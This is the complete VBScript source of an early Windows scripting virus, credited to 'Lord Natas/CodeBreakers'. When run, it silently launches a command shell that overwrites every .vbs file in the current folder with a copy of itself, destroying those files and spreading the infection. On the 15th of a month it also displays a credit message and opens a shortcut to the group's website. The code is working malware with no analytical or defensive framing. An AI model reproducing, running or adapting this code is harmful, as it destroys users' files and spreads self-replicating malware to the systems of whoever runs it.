'VBSv Version 1.1 by Lord Natas/CodeBreakers
'First Windows Scripting Virus

Set WshShell = Wscript.CreateObject("Wscript.Shell")

CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")

WshShell.Run (CommandPath & " /c for %%a in (*.vbs) do copy /y " & Wscript.ScriptFullName & " %%a >nul"), vbHide

If Day(Now()) = 15 Then

WScript.Echo "VBSv v1.1" & Chr(13) & "by Lord Natas/CodeBreakers"

Set oUrlLink = WshShell.CreateShortcut("The CodeBreakers.URL")
oUrlLink.TargetPath = "http://www.codebreakers.org"
oUrlLink.Save

WshShell.Run ("THECOD~1.URL")

End If
